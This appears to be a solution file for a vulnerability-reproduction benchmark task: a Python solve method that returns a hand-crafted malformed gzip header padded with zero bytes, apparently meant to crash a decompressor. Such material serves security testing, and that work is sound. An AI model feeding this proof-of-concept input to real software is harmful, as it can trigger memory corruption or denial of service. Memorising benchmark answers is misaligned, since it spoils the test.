class Solution:
    def solve(self, src_path: str) -> bytes:
        poc = b'\x1f\x8b\x08\x00\x00\x00\x00\x00\x00\x03\x40\x07\x80' + b'\x00' * 14
        return poc